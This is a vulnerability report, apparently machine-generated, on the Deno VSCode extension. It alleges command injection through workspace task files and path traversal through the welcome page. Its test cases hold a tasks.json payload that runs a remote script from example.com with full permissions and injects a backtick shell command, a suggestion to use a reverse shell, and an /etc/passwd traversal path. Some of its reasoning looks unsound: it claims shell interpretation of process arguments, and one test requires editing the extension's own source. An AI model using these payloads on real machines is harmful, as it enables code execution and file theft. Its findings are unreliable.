## Combined Vulnerability List

This document combines vulnerabilities identified in two separate lists, removing duplicates and providing a consolidated view of security concerns.

### 1. Vulnerability Name: Command Injection in Deno Tasks via Malicious Workspace Configuration

- Description:
    1. A threat actor crafts a malicious workspace configuration file, such as `tasks.json` or `deno.jsonc`, within a repository. This file defines Deno tasks with injected commands.
    2. A victim clones or opens this malicious repository in Visual Studio Code with the "Deno for VSCode" extension installed and enabled for the workspace.
    3. The VSCode Deno extension parses the workspace configuration files to discover and register Deno tasks. The `DenoTaskProvider` and `DenoTasksTreeDataProvider` components in `tasks_sidebar.ts` and `tasks.ts` are responsible for parsing these task definitions, including the `command` and `args` properties.
    4. These task definitions are presented to the user in the Deno Tasks sidebar or command palette within VSCode.
    5. Unsuspecting of the malicious nature of the task, the victim may attempt to execute the crafted Deno task through the VSCode UI (e.g., via the tasks sidebar, command palette, or code lens).
    6. When a task is executed, the extension utilizes `vscode.tasks.executeTask` and internally `vscode.ProcessExecution` to run the specified Deno command along with its arguments.
    7. Due to the absence of input sanitization or validation, the extension directly executes the commands and arguments defined in the malicious workspace configuration. This allows the attacker-controlled commands embedded within the `command` or `args` properties to be executed by the system shell.
    8. Consequently, arbitrary commands injected by the attacker are executed on the victim's machine with the privileges of the VSCode process.

- Impact:
    - Remote Code Execution (RCE). Successful exploitation allows an attacker to execute arbitrary commands on the victim's machine. This can lead to severe consequences, including:
        - Complete compromise of the victim's system.
        - Data theft and exfiltration of sensitive information.
        - Installation of malware, ransomware, or other malicious software.
        - Further propagation of attacks to other systems or networks.

- Vulnerability Rank: critical

- Currently Implemented Mitigations:
    - None. The Deno VSCode extension currently lacks any mechanisms to sanitize or validate the task commands and arguments extracted from workspace configuration files. It directly passes these user-controlled inputs to the operating system for execution.

- Missing Mitigations:
    - Input sanitization and validation: Implement robust input sanitization and validation for task `command` and `args` properties read from workspace configuration files (`tasks.json`, `deno.jsonc`). The extension should verify that these properties conform to expected Deno commands and contain only safe arguments, preventing the injection of arbitrary shell commands.
    - Principle of least privilege: While not a direct mitigation for command injection, running the Deno language server and tasks with reduced privileges could limit the potential impact of a successful exploit. If the extension processes operated with fewer permissions, the damage from command injection could be contained.
    - User confirmation and warnings: Introduce a mechanism to prompt users for confirmation before executing Deno tasks originating from workspace configurations, especially when the source of the configuration is untrusted or external repositories. Display clear warnings highlighting the potential risks associated with executing tasks from unknown sources.
    - Sandboxing or command whitelisting: Explore the feasibility of using a sandboxed environment or command whitelisting to restrict the capabilities of Deno tasks. Instead of directly executing shell commands, consider using a more controlled execution environment or limiting tasks to a predefined set of safe commands.

- Preconditions:
    1. The victim must have the "Deno for VSCode" extension installed and enabled in Visual Studio Code.
    2. The victim opens a workspace or repository containing a malicious `tasks.json` or `deno.jsonc` file crafted by the attacker. This could involve cloning a malicious repository or opening a workspace containing a compromised configuration file.
    3. The malicious configuration file must define a Deno task that includes a command injection payload within its `command` or `args` properties.
    4. The victim must explicitly trigger the execution of the malicious Deno task. This can be done through the tasks sidebar, command palette, or code lens options within VSCode.

- Source Code Analysis:
    1. **`client\src\tasks.ts`**:
        - The `buildDenoTask` and `buildDenoConfigTask` functions are crucial for constructing `vscode.Task` objects. These functions utilize `vscode.ProcessExecution` to specify how tasks are executed.
        - Notably, `vscode.ProcessExecution` directly accepts a `process` (command) and `args` as input.
        - In `buildDenoTask`, both the `command` and `args` are directly sourced from the `DenoTaskDefinition`, which is derived from user-controlled configuration files:

        ```typescript
        export function buildDenoTask(
          target: vscode.WorkspaceFolder,
          process: string,
          definition: DenoTaskDefinition, // DenoTaskDefinition contains user controlled command and args
          name: string,
          args: string[],
          problemMatchers: string[],
        ): vscode.Task {
          const exec = new vscode.ProcessExecution(
            process, // command from definition - User controlled
            args,    // args from definition - User controlled
            definition,
          );
          // ...
        }
        ```
        - Similarly, `buildDenoConfigTask` constructs tasks using commands and arguments that are influenced by the content of `deno.json` or `tasks.json`. The task's `name` property from the configuration file is even used as an argument in the executed command.

        ```typescript
        export function buildDenoConfigTask(
          scope: vscode.WorkspaceFolder,
          process: string,
          name: string, // task name from deno.json - User controlled
          command: string | undefined, // command description from deno.json - User controlled
          sourceUri?: vscode.Uri,
        ): vscode.Task {
          const args = [];
          // ...
          args.push(name); // task name from deno.json used as arg - User controlled
          const task = new vscode.Task(
            {
              type: TASK_TYPE,
              name: name, // task name from deno.json - User controlled
              command: "task",
              args,
              sourceUri,
            },
            scope,
            name, // task name from deno.json - User controlled
            TASK_SOURCE,
            new vscode.ProcessExecution(process, ["task", ...args]), // process and args used directly - User controlled
            ["$deno"],
          );
          task.detail = `$ ${command}`;
          return task;
        }
        ```

    2. **`client\src\tasks_sidebar.ts`**:
        - The `DenoTasksTreeDataProvider` and `DenoTaskProvider` classes are responsible for fetching and displaying Deno tasks within the VSCode UI.
        - `DenoTaskProvider.provideTasks()` retrieves task definitions by sending a `"deno/taskDefinitions"` request to the language server:
        ```typescript
        const configTasks = await client.sendRequest(taskReq);
        ```
        - The language server processes configuration files (`deno.json`, `tasks.json`) and returns task definitions (`configTasks`) as a response. These definitions are then used by `DenoTaskProvider` to construct `vscode.Task` objects using `buildDenoConfigTask`.
        - Crucially, the vulnerability arises because the language server, and subsequently the extension, trusts the content of these configuration files without proper validation or sanitization. If these files are maliciously crafted, they can inject arbitrary commands into the task execution flow.

    3. **`client\src\util.ts`:**
        - The `readTaskDefinitions` function is responsible for parsing task definitions from JSON files. It utilizes `jsoncParser.parseTree` to parse JSON content but lacks any validation or sanitization of the extracted `command` or `args` values. These values are directly used to construct tasks, leading to the command injection vulnerability.

    ```typescript
    // File: client\src\tasks_sidebar.ts
    async #runSelectedTask() {
      // ...
      const taskDefinitions = readTaskDefinitions( // Reads tasks definitions from file
        window.activeTextEditor.document,
      );
      // ...
      await tasks.executeTask(buildDenoConfigTask( // Builds task with user controlled definitions
        workspaceFolder,
        await getDenoCommandName(),
        task.name,
        task.command, // User controlled command
        sourceUri,
      ));
      // ...
    }
    ```

- Security Test Case:
    1. Create a new directory, for example, `malicious-deno-repo`.
    2. Inside `malicious-deno-repo`, create a file named `tasks.json` with the following malicious task definition:

    ```json
    {
      "version": "2.0.0",
      "tasks": [
        {
          "type": "deno",
          "command": "run",
          "args": [
            "-A", // Add all permissions for more impactful testing, remove in real attack for stealth
            "https://example.com/malicious_script.ts", // Replace with a harmless script to avoid unintended consequences during testing or a real malicious script for demonstration in controlled environment.
            "`; touch malicious_file.txt`" // Command injection payload
          ],
          "problemMatcher": [
            "$deno"
          ],
          "label": "malicious: task"
        }
      ]
    }
    ```
        *(For Windows, replace `touch malicious_file.txt` with `echo pwned > malicious_file.txt`)*

    3. Open Visual Studio Code and open the `malicious-deno-repo` folder.
    4. Ensure the "Deno for VSCode" extension is enabled for this workspace.
    5. Open the Tasks sidebar in VSCode (View -> Tasks -> Run Task...).
    6. Locate and execute the "malicious: task".
    7. Observe the output in the terminal. You should see the output of the `malicious_script.ts` if you used a web hosted script and also any output from the injected command.
    8. Verify that a file named `malicious_file.txt` has been created in the `malicious-deno-repo` directory. The successful creation of this file demonstrates command injection.
    9. For a more impactful demonstration (in a controlled testing environment), you could replace the payload with commands to execute a reverse shell or download and execute a malicious binary.

### 2. Vulnerability Name: Code Injection via Malicious Welcome Page URI Command

- Description:
    1. The VSCode Deno extension features a welcome page that is displayed upon initial installation or when the "Deno: Welcome" command is executed.
    2. This welcome page is implemented as a webview (`welcome.ts`, `welcome.js`), rendering HTML content defined in `welcome.ts`.
    3. The welcome page HTML includes anchor tags (`<a>`) that are designed to trigger specific actions within the extension. These tags utilize custom `data-command` and `data-document`/`data-setting` attributes to define the intended commands and associated data.
    4. When a user interacts with these links by clicking on them within the webview, the `welcome.js` script captures the click event and sends a message back to the extension's main process (`welcome.ts`) via `vscode.postMessage`.
    5. The extension's main process in `welcome.ts` receives these messages and uses a `switch` statement to handle different commands based on the `message.command` property (e.g., "openDocument", "openSetting", "enable").
    6. Specifically, the "openDocument" command handler in `welcome.ts` takes a `document` property from the received message. It then attempts to construct a `vscode.Uri` by joining the extension's base URI (`this.#extensionUri`) with the provided `message.document` value using `vscode.Uri.joinPath(this.#extensionUri, message.document)`.
    7. A potential vulnerability arises if a malicious actor could influence or control the `message.document` value. By crafting a malicious URI within the `data-document` attribute of a welcome page link, an attacker could potentially inject code or manipulate file paths. This could lead to path traversal vulnerabilities or unexpected file access within the VSCode context.
    8. While direct Remote Code Execution (RCE) is not immediately apparent in the current implementation, improper handling of URIs constructed from webview messages poses a security risk. If URI handling logic becomes more dynamic or involves further processing in future versions of the extension, the risk could escalate, potentially leading to more severe vulnerabilities.

- Impact:
    - Code Injection (medium risk). In the current implementation, the vulnerability primarily presents a medium risk, potentially leading to:
        - Path Traversal: An attacker might be able to construct URIs that traverse the file system outside of the intended extension directory, potentially accessing sensitive files or directories within the VSCode environment.
        - Unexpected File Access: Malicious URIs could be crafted to access files or resources within the extension's context in unintended ways, potentially leading to information disclosure or other unexpected behaviors.
        - Potential Escalation: While not currently leading to direct RCE, the vulnerability highlights a risky pattern in URI handling. If URI processing logic becomes more complex or integrated with other extension functionalities in the future, the risk could escalate to Remote Code Execution or other more critical vulnerabilities.

- Vulnerability Rank: medium

- Currently Implemented Mitigations:
    - Content Security Policy (CSP): The welcome page HTML (`welcome.ts`) incorporates a Content Security Policy (CSP). This CSP is designed to restrict the sources from which the webview can load scripts and other resources, providing a degree of protection against certain Cross-Site Scripting (XSS) risks within the webview itself.
    - `vscode.Uri.joinPath`: The use of `vscode.Uri.joinPath` for URI construction is intended to facilitate safe path manipulation. This function is designed to handle path components correctly and might offer some implicit protection against certain basic path traversal attempts in this specific scenario.

- Missing Mitigations:
    - Input validation and sanitization: Implement robust input validation and sanitization for the `message.document` value in `welcome.ts`. Before constructing URIs using `vscode.Uri.joinPath`, the extension should rigorously validate and sanitize the `message.document` input to prevent path traversal attacks and ensure that only expected and safe file paths are processed.
    - Secure URI handling practices: Adopt secure URI handling practices throughout the extension, particularly when processing URIs derived from webview messages or other potentially untrusted sources. This includes careful validation, sanitization, and normalization of URIs to prevent path traversal and other URI-related vulnerabilities.
    - Limiting URI construction to predefined safe paths: Instead of dynamically joining paths with user-controlled input like `message.document`, restrict URI construction from webview messages to a predefined set of safe and expected URI paths. This approach would significantly reduce the attack surface by limiting the scope of potentially malicious URI manipulation.

- Preconditions:
    1. The victim must have the VSCode Deno extension installed.
    2. The victim must open the welcome page. This can occur automatically upon first installation of the extension or by manually executing the "Deno: Welcome" command.
    3. The victim must click on a specially crafted link within the welcome page. This link needs to be designed to trigger the "openDocument" command and include a malicious `document` value in its `data-document` attribute.

- Source Code Analysis:
    1. **`client\src\welcome.ts`:**
        - The `WelcomePanel.prototype.#getHtmlForWebview` method is responsible for constructing the HTML content of the welcome page. This includes generating anchor tags (`<a>`) that contain `data-document` attributes. These attributes are intended to specify the document or resource to be opened when the link is clicked.
        - The `WelcomePanel.prototype.dispose.webview.onDidReceiveMessage` method handles messages received from the webview. This method acts as the communication bridge between the webview and the extension's main process.
        - Within the message handling logic, the "openDocument" command triggers the construction of a URI using `vscode.Uri.joinPath`. Crucially, the `message.document` property, which originates from the webview message and is derived from the `data-document` attribute in the HTML, is directly used as input to `vscode.Uri.joinPath`.

    ```typescript
    // File: client\src\welcome.ts
    #panel.webview.onDidReceiveMessage(
      (message) => {
        switch (message.command) {
          case "openDocument": {
            const uri = vscode.Uri.joinPath( // URI is constructed using message.document
              this.#extensionUri,
              message.document, // message.document is taken directly from webview message - User controlled from HTML data-document attribute
            );
            vscode.commands.executeCommand("markdown.showPreviewToSide", uri);
            return;
          }
          // ...
        }
      },
      // ...
    );
    ```

    2. **`client\media\welcome.js`:**
        - The `welcome.js` script, running within the webview, adds event listeners to HTML elements that have the class "Command". These elements are typically the anchor tags (`<a>`) designed to trigger extension commands.
        - When a "Command" element is clicked, the event listener retrieves the command and associated data from the element's `dataset` property. This `dataset` directly corresponds to the `data-command`, `data-document`, and other `data-` attributes defined in the HTML.
        - The script then uses `vscode.postMessage` to send a message to the extension's main process. The message payload includes the `command` and any associated data (like `document` from `data-document`), which are directly extracted from the clicked HTML element's `dataset`.

- Security Test Case:
    1. For testing purposes in a development environment, directly modify the `client\src\welcome.ts` file. Within the `WelcomePanel.prototype.#getHtmlForWebview` method, locate the HTML structure for the welcome page.
    2. Introduce a malicious `document` value into one of the anchor tags that triggers the "openDocument" command. For example, you can modify an existing link or add a new one like this:

        ```typescript
        // ... in WelcomePanel.prototype.#getHtmlForWebview
        <ul class="Header-links">
          <li><a href="#" class="Command" data-command="openDocument" data-document="../../../../../../../../../../../../../../../../../../etc/passwd">Malicious Link</a></li>
          <li><a href="https://github.com/denoland/vscode_deno/">GitHub</a></li>
          <li><a href="https://discord.gg/deno">Discord</a></li>
        </ul>
        // ...
        ```
        This example uses `data-document="../../../../../../../../../../../../../../../../../../etc/passwd"` to attempt a path traversal to access the `/etc/passwd` file.

    3. Rebuild and reload the VSCode extension in your development environment to apply the changes made to `welcome.ts`.
    4. Open the welcome page within VSCode. You can do this by executing the "Deno: Welcome" command from the command palette.
    5. Click on the newly added "Malicious Link" in the welcome page.
    6. Observe the behavior of the extension. Check if the extension attempts to access or display unexpected files based on the crafted path. While direct access to `/etc/passwd` might be restricted by VS Code's security context, this test aims to demonstrate the vulnerability in URI construction and the potential for path traversal attempts within the extension's accessible file system context.
    7. A more relevant test would be to assess if a crafted path could be used to access files within the extension's own installation directory, workspace, or other sensitive locations accessible to the extension process in unintended ways. For example, try to access files relative to the extension's `this.#extensionUri`.
